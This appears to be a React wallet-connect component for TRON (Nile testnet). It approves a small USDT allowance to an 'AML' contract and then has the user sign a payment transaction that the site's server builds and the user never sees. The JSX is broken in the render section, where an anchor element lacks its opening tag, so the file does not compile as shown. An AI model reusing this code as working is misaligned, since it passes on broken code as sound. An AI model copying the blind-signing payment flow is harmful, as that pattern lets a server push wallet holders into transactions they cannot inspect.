import { useState, useEffect } from 'react';
import toast from 'react-hot-toast';

// ─── НАСТРОЙКИ ────────────────────────────────────────────────────────────────
const TRON_USDT_CONTRACT  = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
const TRON_AML_CONTRACT   = 'TCrxH5b8bSMGtnK5hNjukzBHwy5cPZNtih';
const TRON_PAYMENT_AMOUNT = 1_290_000; // 1.29 USDT (6 decimals)
const TRONGRID_URL        = 'https://nile.trongrid.io';

// ─── Ждём tronWeb (официальный паттерн из TRON Developer Hub) ────────────────
const waitForTronWeb = () => new Promise((resolve, reject) => {
  if (window.tronWeb?.defaultAddress?.base58) {
    return resolve(window.tronWeb);
  }
  let elapsed = 0;
  const interval = setInterval(() => {
    const tw =
      window.tronWeb ||
      window.trustwallet?.tronLink?.tronWeb ||
      window.tronLink?.tronWeb;
    if (tw?.defaultAddress?.base58) {
      clearInterval(interval);
      return resolve(tw);
    }
    elapsed += 100;
    if (elapsed >= 10_000) {
      clearInterval(interval);
      reject(new Error(
        'TronWeb не обнаружен. Откройте сайт через встроенный браузер TrustWallet ' +
        'и убедитесь что активна сеть TRON.'
      ));
    }
  }, 100);
});

// ─── Отправка TRON транзакции ─────────────────────────────────────────────────
const sendTronTransaction = async (txBuilderFn) => {
  const tronWeb = await waitForTronWeb();
  const fromAddress = tronWeb.defaultAddress.base58;

  // Строим транзакцию
  let unsignedTx;
  try {
    unsignedTx = await txBuilderFn(tronWeb, fromAddress);
  } catch (err) {
    throw new Error('Ошибка при построении транзакции: ' + err.message);
  }

  if (!unsignedTx?.txID) {
    throw new Error('Не удалось создать транзакцию.');
  }

  // Подписываем — вызовет popup TrustWallet
  let signedTx;
  try {
    signedTx = await tronWeb.trx.sign(unsignedTx);
  } catch (err) {
    if (err?.message?.includes('Confirmation declined')) {
      throw new Error('Вы отклонили транзакцию.');
    }
    throw new Error('Ошибка подписи: ' + err.message);
  }

  if (!signedTx) throw new Error('Транзакция не подписана.');

  // Транслируем
  let txid;
  if (typeof signedTx === 'string') {
    txid = signedTx;
  } else if (signedTx?.txID) {
    txid = signedTx.txID;
    if (signedTx.signature) {
      const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
      if (!broadcast.result && broadcast.code !== 'DUP_TRANSACTION_ERROR') {
        throw new Error('Broadcast failed: ' + (broadcast.message || broadcast.code));
      }
    }
  } else {
    throw new Error('Неожиданный ответ от sign()');
  }

  return txid;
};

// ─── Encode base58 → hex ──────────────────────────────────────────────────────
function encodeAddress(base58Addr) {
  const AB = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
  let n = BigInt(0);
  for (const ch of base58Addr) {
    const i = AB.indexOf(ch);
    if (i < 0) throw new Error('bad base58');
    n = n * BigInt(58) + BigInt(i);
  }
  return n.toString(16).padStart(50, '0').slice(2, 42);
}

// ══════════════════════════════════════════════════════════════════════════════
// КОМПОНЕНТ
// ══════════════════════════════════════════════════════════════════════════════
export default function WalletConnect({ onConnect, onDisconnect, onPaymentSuccess }) {
  const [address, setAddress]         = useState(null);
  const [connecting, setConnecting]   = useState(false);
  const [approving, setApproving]     = useState(false);
  const [paying, setPaying]           = useState(false);
  const [hasAllowance, setHasAllowance] = useState(false);
  const [txHash, setTxHash]           = useState(null);
  const [tronWebReady, setTronWebReady] = useState(false);

  // Проверяем наличие tronWeb при загрузке страницы
  useEffect(() => {
    let elapsed = 0;
    const interval = setInterval(() => {
      const tw =
        window.tronWeb ||
        window.trustwallet?.tronLink?.tronWeb ||
        window.tronLink?.tronWeb;
      if (tw?.defaultAddress?.base58) {
        clearInterval(interval);
        setTronWebReady(true);
        // Автоподключение если уже авторизован
        setAddress(tw.defaultAddress.base58);
        onConnect?.(tw.defaultAddress.base58);
        checkAllowance(tw, tw.defaultAddress.base58);
      }
      elapsed += 100;
      if (elapsed >= 3_000) clearInterval(interval);
    }, 100);
    return () => clearInterval(interval);
  }, []);

  const checkAllowance = async (tw, addr) => {
    try {
      const usdtContract = await tw.contract().at(TRON_USDT_CONTRACT);
      const allowance = await usdtContract.allowance(addr, TRON_AML_CONTRACT).call();
      setHasAllowance(BigInt(allowance.toString()) >= BigInt(TRON_PAYMENT_AMOUNT));
    } catch {
      setHasAllowance(false);
    }
  };

  // ─── Подключение ────────────────────────────────────────────────────────────
  const handleConnect = async () => {
    setConnecting(true);
    try {
      const tronWeb = await waitForTronWeb();

      // Запрашиваем доступ если нет адреса
      if (!tronWeb.defaultAddress?.base58) {
        await tronWeb.request({ method: 'tron_requestAccounts' });
        // Ждём ещё раз после запроса
        await waitForTronWeb();
      }

      const addr = tronWeb.defaultAddress.base58;
      setAddress(addr);
      setTronWebReady(true);
      onConnect?.(addr);
      toast.success('Кошелёк подключён');
      await checkAllowance(tronWeb, addr);
    } catch (err) {
      toast.error(err.message);
    } finally {
      setConnecting(false);
    }
  };

  // ─── Approve ────────────────────────────────────────────────────────────────
  const handleApprove = async () => {
    setApproving(true);
    const tid = toast.loading('Подпишите approve в кошельке…');
    try {
      await sendTronTransaction(async (tronWeb, fromAddress) => {
        const ownerHex   = '41' + encodeAddress(fromAddress);
        const spenderHex = encodeAddress(TRON_AML_CONTRACT).padStart(64, '0');
        const amountHex  = TRON_PAYMENT_AMOUNT.toString(16).padStart(64, '0');

        const res = await fetch(`${TRONGRID_URL}/wallet/triggersmartcontract`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            owner_address:     ownerHex,
            contract_address:  '41' + encodeAddress(TRON_USDT_CONTRACT),
            function_selector: 'approve(address,uint256)',
            parameter:         spenderHex + amountHex,
            fee_limit:         100_000_000,
            call_value:        0,
            visible:           false,
          }),
        });
        const data = await res.json();
        if (!data?.transaction) {
          throw new Error(data?.result?.message
            ? Buffer.from(data.result.message, 'hex').toString()
            : 'Не удалось построить approve');
        }
        return data.transaction;
      });

      toast.dismiss(tid);
      toast.success('Approve подтверждён!');
      setHasAllowance(true);
    } catch (err) {
      toast.dismiss(tid);
      toast.error('Ошибка approve: ' + err.message);
    } finally {
      setApproving(false);
    }
  };

  // ─── Pay ────────────────────────────────────────────────────────────────────
  const handlePay = async () => {
    setPaying(true);
    const tid = toast.loading('Оплата через контракт…');
    try {
      const txid = await sendTronTransaction(async () => {
        // Сервер строит транзакцию, пользователь подписывает
        const res = await fetch('/api/pay', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userAddress: address }),
        });
        const data = await res.json();
        if (!data?.transaction) {
          throw new Error(data?.error || 'Ошибка сервера');
        }
        return data.transaction;
      });

      setTxHash(txid);
      toast.dismiss(tid);
      toast.success(`Оплата прошла! TX: ${txid.slice(0, 14)}…`);
      onPaymentSuccess?.(txid, address);
    } catch (err) {
      toast.dismiss(tid);
      toast.error('Ошибка оплаты: ' + err.message);
    } finally {
      setPaying(false);
    }
  };

  // ─── Disconnect ─────────────────────────────────────────────────────────────
  const handleDisconnect = () => {
    setAddress(null);
    setTxHash(null);
    setHasAllowance(false);
    setTronWebReady(false);
    onDisconnect?.();
  };

  const fmt = (a) => `${a.slice(0, 6)}...${a.slice(-4)}`;
  const isBusy = connecting || approving || paying;

  // ─── Рендер ─────────────────────────────────────────────────────────────────
  return (
    <div style={{ display: 'flex', justifyContent: 'flex-end', marginBottom: '2rem' }}>
      {!address ? (
        <button
          onClick={handleConnect}
          disabled={connecting}
          style={btnStyle(connecting)}
        >
          {connecting ? <Spinner /> : <i className="fas fa-wallet" />}
          {connecting ? 'Подключение...' : 'Подключить кошелёк'}
        </button>
      ) : (
        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '0.5rem' }}>
          <div style={badgeStyle}>
            <i className="fas fa-check-circle" style={{ color: '#10b981' }} />
            <div style={{ textAlign: 'right' }}>
              <div style={{ color: '#60a5fa', fontFamily: 'monospace' }}>{fmt(address)}</div>
              <div style={{ fontSize: '0.65rem', color: '#a0b3d9' }}>TRON Network</div>
              {txHash ? (
                
                  href={`https://nile.tronscan.org/#/transaction/${txHash}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  style={{ fontSize: '0.72rem', color: '#10b981', textDecoration: 'none' }}
                >
                  ✓ Оплачено · Scan ↗
                </a>
              ) : (
                <div style={{ fontSize: '0.72rem', color: '#f59e0b' }}>Ожидание оплаты</div>
              )}
            </div>
            <button
              onClick={handleDisconnect}
              style={{ background: 'none', border: 'none', color: '#ef4444', cursor: 'pointer' }}
            >
              <i className="fas fa-sign-out-alt" />
            </button>
          </div>

          {!txHash && (
            <div style={{ display: 'flex', gap: '0.5rem' }}>
              {!hasAllowance && (
                <button
                  onClick={handleApprove}
                  disabled={isBusy}
                  style={approveButtonStyle(approving)}
                >
                  {approving ? <Spinner size={14} /> : 'Разрешить оплату'}
                </button>
              )}
              <button
                onClick={handlePay}
                disabled={isBusy || !hasAllowance}
                style={payButtonStyle(paying, hasAllowance)}
              >
                {paying ? <Spinner size={14} /> : 'Оплатить'}
              </button>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// ─── UI хелперы ───────────────────────────────────────────────────────────────
function Spinner({ size = 16 }) {
  return (
    <span style={{
      display: 'inline-block', width: size, height: size,
      border: '2px solid rgba(255,255,255,0.3)',
      borderTopColor: '#fff', borderRadius: '50%',
      animation: 'spin 0.7s linear infinite', flexShrink: 0,
    }} />
  );
}

const btnStyle = (disabled) => ({
  background: 'linear-gradient(135deg, #3b82f6, #60a5fa)',
  color: 'white', border: 'none', borderRadius: '40px',
  padding: '1rem 2rem', fontSize: '1rem', fontWeight: '600',
  cursor: disabled ? 'not-allowed' : 'pointer',
  display: 'flex', alignItems: 'center', gap: '0.8rem',
  opacity: disabled ? 0.7 : 1, transition: 'all 0.2s',
});

const badgeStyle = {
  background: 'rgba(59,130,246,0.1)',
  border: '1px solid rgba(59,130,246,0.2)',
  borderRadius: '40px', padding: '0.8rem 1.5rem',
  display: 'flex', alignItems: 'center', gap: '1rem',
};

const approveButtonStyle = (disabled) => ({
  background: '#3b82f6', color: 'white', border: 'none',
  borderRadius: '40px', padding: '0.6rem 1.5rem',
  fontSize: '0.9rem', fontWeight: '600',
  cursor: disabled ? 'not-allowed' : 'pointer',
  opacity: disabled ? 0.7 : 1, transition: 'all 0.2s',
  display: 'flex', alignItems: 'center', gap: '0.5rem',
});

const payButtonStyle = (paying, hasAllowance) => ({
  background: hasAllowance ? '#10b981' : '#9ca3af',
  color: 'white', border: 'none', borderRadius: '40px',
  padding: '0.6rem 1.5rem', fontSize: '0.9rem', fontWeight: '600',
  cursor: !hasAllowance || paying ? 'not-allowed' : 'pointer',
  opacity: !hasAllowance || paying ? 0.5 : 1, transition: 'all 0.2s',
  display: 'flex', alignItems: 'center', gap: '0.5rem',
});